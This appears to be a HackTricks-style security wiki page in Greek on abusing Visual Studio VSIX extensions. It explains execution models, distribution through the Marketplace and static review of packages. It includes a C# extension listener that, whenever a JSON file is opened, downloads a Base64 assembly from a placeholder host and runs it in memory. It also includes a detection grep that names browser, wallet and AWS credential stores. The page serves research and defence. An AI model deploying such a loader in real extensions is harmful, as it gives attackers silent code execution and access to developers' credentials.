# Κατάχρηση επεκτάσεων VSIX του Visual Studio

{{#include ../banners/hacktricks-training.md}}

Μια επέκταση του Visual Studio μπορεί να μετατρέψει τη συνηθισμένη χρήση του επεξεργαστή σε εκτέλεση κώδικα με την ταυτότητα του συνδεδεμένου χρήστη. Ένα κακόβουλο VSIX, ένας εκδότης με παραπλανητική ονομασία ή μια παραβιασμένη ενημέρωση επέκτασης μπορεί να προσεγγίσει αυτόν τον χρήστη μέσω των κανονικών καναλιών εγκατάστασης. Η εγκατάσταση με προτροπή διαχειριστή είναι μια συναινετική διαδικασία εγκατάστασης, όχι αυτόματη κλιμάκωση προνομίων.<sup>[[1]](#references)</sup>

## Μοντέλο εκτέλεσης

Οι επεκτάσεις του κλασικού VSSDK εκτελούνται συνήθως μέσα στο `devenv.exe`. Το νεότερο μοντέλο `VisualStudio.Extensibility` εκτελεί κυρίως σύγχρονες επεκτάσεις .NET εκτός διεργασίας: το Visual Studio μεσολαβεί στις κλήσεις προς μια αποκλειστική διεργασία `Microsoft.ServiceHub.Host.Extensibility`, απομονώνοντας τη σταθερότητα του IDE, αλλά **χωρίς** να περιορίζει την πρόσβαση της επέκτασης στα δικαιώματα Windows του χρήστη. Το ακριβές όνομα του εκτελέσιμου αρχείου μπορεί να περιλαμβάνει επίθημα αρχιτεκτονικής, όπως `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Ενεργοποίηση με τη συνήθη δραστηριότητα στον επεξεργαστή

Αντί να εμφανίζει μόνο μια ευδιάκριτη εντολή μενού, μια επέκταση μπορεί να υλοποιήσει το `ITextViewOpenClosedListener`. Η επανάκλησή της `TextViewOpenedAsync` καλείται για έγγραφα που πληρούν τα κριτήρια, ενώ το `TextViewExtensionConfiguration.AppliesTo` μπορεί να περιορίσει την ενεργοποίηση σε έναν συνηθισμένο τύπο, όπως το JSON. Ένας πραγματικός μορφοποιητής ή linter μπορεί να εκτελεί κανονικά τη διαφημιζόμενη λειτουργία του, ενώ μια δεύτερη ενέργεια εκτελείται ως παρενέργεια κατά το άνοιγμα ενός αρχείου.<sup>[[1]](#references)[[3]](#references)</sup>

Το ακόλουθο απλοποιημένο μοτίβο παρουσιάζει τα σημαντικά σημεία εκτέλεσης· για λόγους σαφήνειας, παραλείπει τον νόμιμο μορφοποιητή και τη διαχείριση σφαλμάτων.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Φορτωτής διαχειριζόμενης assembly στη μνήμη, με ενεργοποίηση από συμβάν</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Αυτή η αλυσίδα κατεβάζει κείμενο Base64, το αποκωδικοποιεί σε bytes assembly, το φορτώνει από ένα `MemoryStream` μέσω ενός συλλέξιμου `AssemblyLoadContext`, καλεί το ανακλώμενο `EntryPoint` χωρίς παραμέτρους ή με ένα `string[]`, αναμένει τα ασύγχρονα entry points και αποφορτώνει το context. Το δεύτερο στάδιο δεν εγγράφεται στον δίσκο, αν και το VSIX και το κύριο DLL της επέκτασης παραμένουν τεχνουργήματα στον δίσκο. Το Base64 δεν παρέχει αυθεντικότητα ή εμπιστευτικότητα· η χρήση HTTP επιτρέπει επίσης σε έναν επιτιθέμενο που βρίσκεται στη διαδρομή να αντικαταστήσει την απόκριση.<sup>[[1]](#references)</sup>

Οι λειτουργικές παραλλαγές περιλαμβάνουν την απόκρυψη όλων των εξαιρέσεων, ώστε η διαφημιζόμενη λειτουργία να συνεχίσει όταν αποτύχει η προετοιμασία, ή τη χρήση του `ITextViewChangedListener` για ενεργοποίηση μετά από επεξεργασίες. Ο κώδικας εκτελείται στο extension host και μπορεί να χρησιμοποιήσει managed APIs, P/Invoke, αρχεία, διαπιστευτήρια και θυγατρικές διεργασίες που είναι διαθέσιμες σε αυτόν τον χρήστη.<sup>[[1]](#references)</sup>

Για μια σχετική επιφάνεια εκτέλεσης ειδική για editor, η οποία βασίζεται στην αυτόματη φόρτωση native plugin, δείτε:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Κατάχρηση εμπιστοσύνης στο Marketplace και στη διανομή

Ένα VSIX μπορεί να φτάσει ως αρχείο που κοινοποιήθηκε απευθείας ή μέσω phishing, από το Marketplace στον ιστό ή μέσω του ενσωματωμένου προγράμματος περιήγησης Marketplace του Visual Studio. Η εγγραφή εκδοτών, η οποία επιβάλλει κυρίως μοναδικότητα και μια λίστα δεσμευμένων λέξεων, μπορεί να επιτρέψει ταυτότητες εκδοτών που μοιάζουν παραπλανητικά με άλλες· ο συμβιβασμός ενός ήδη έμπιστου εκδότη ή επέκτασης είναι ακόμη πιο αποτελεσματικός, επειδή αξιοποιεί την υπάρχουσα εγκατεστημένη βάση χρηστών. Η εγκατάσταση από το Marketplace καλεί το Visual Studio Installer και τοποθετεί προσωρινά το ληφθέν VSIX στο `%LOCALAPPDATA%\Temp`· το `payload.vsix` χρησιμοποιείται επίσης νόμιμα, επομένως το όνομα αρχείου από μόνο του δεν αποτελεί ένδειξη.<sup>[[1]](#references)</sup>

Η MDSec δεν εντόπισε URL protocol του Visual Studio που να εγκαθιστά απευθείας μια επέκταση. Ο χειριστής εξακολουθεί να χρειάζεται ο χρήστης να εγκαταστήσει/εμπιστευτεί το VSIX ή να θέσει σε κίνδυνο τη διαδρομή διανομής μιας υπάρχουσας επέκτασης. Ένα πακέτο `AllUsers` εγκαθίσταται στον φάκελο εγκατάστασης του Visual Studio και ενδέχεται να ζητήσει ανύψωση δικαιωμάτων, αλλά αυτό αποτελεί συνήθη συμπεριφορά του installer με συγκατάθεση και όχι αυτόματη οδό προς δικαιώματα administrator ή SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Στατικός έλεγχος σε μεγάλη κλίμακα

Τα πακέτα VSIX είναι συνήθως αρχεία ZIP, οπότε μια ασφαλής διαδικασία ελέγχου του Marketplace μπορεί να απαριθμήσει πακέτα, να τα αποσυμπιέσει **χωρίς να φορτώσει κώδικα επέκτασης**, να αναλύσει τα manifests, να εντοπίσει επιφάνειες εκτέλεσης και να αποσυμπιλήσει managed assemblies με το `ilspycmd`. Δώστε προτεραιότητα στα assemblies που ανήκουν στην επέκταση, αφού εξαιρέσετε τις συνήθεις ενσωματωμένες εξαρτήσεις, και στη συνέχεια συσχετίστε συμβολοσειρές αποθηκών διαπιστευτηρίων με συμπεριφορικές ομάδες, όπως ανάγνωση αρχείων και αποστολή μέσω δικτύου, κωδικοποίηση και αποστολή, λήψη και εκτέλεση, διαχείριση διαπιστευτηρίων και πρόσβαση στο δίκτυο ή λήψη στιγμιότυπου οθόνης και αποστολή.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Επίσης, καταγράψτε τα native DLLs, τα MSBuild targets, τα scripts, τα T4 templates και τα installer payloads, αντί να υποθέτετε ότι κάθε επιφάνεια εκτέλεσης αποτελείται από managed code. Συγκρίνετε την ύποπτη συμπεριφορά με τον σκοπό που δηλώνεται στο manifest· η τηλεμετρία και οι νόμιμοι updaters μπορεί να μοιάζουν με exfiltration ή staging. Η αποκλειστικά στατική ανάλυση δεν εντοπίζει packed, obfuscated, δυναμικά επιλυμένο και ανενεργό κώδικα, ενώ η εξέταση μόνο της πιο πρόσφατης έκδοσης παραλείπει κακόβουλες παλαιότερες εκδόσεις.<sup>[[1]](#references)</sup>

Το VS Code χρησιμοποιεί διαφορετικό extension host και manifest. Για ένα εγγράψιμο κοινόχρηστο στοιχείο που τροφοδοτεί μια αυτοματοποιημένη εγκατάσταση VS Code extension, δείτε το [VS Code extension drop-share execution](vscode-extension-abuse.md).

Μια ξεχωριστή επίθεση κατά τη φόρτωση project μπορεί να εκτελέσει ένα κακόβουλο [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) χωρίς εγκατάσταση VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Οι επεκτάσεις Visual Studio υπό νέο πρίσμα](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Σχετικά με το VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Η δομή ενός πακέτου VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - Το εργαλείο .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Η εκστρατεία Blinder Tunnel στοχεύει υποδομές στο Ιράκ](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
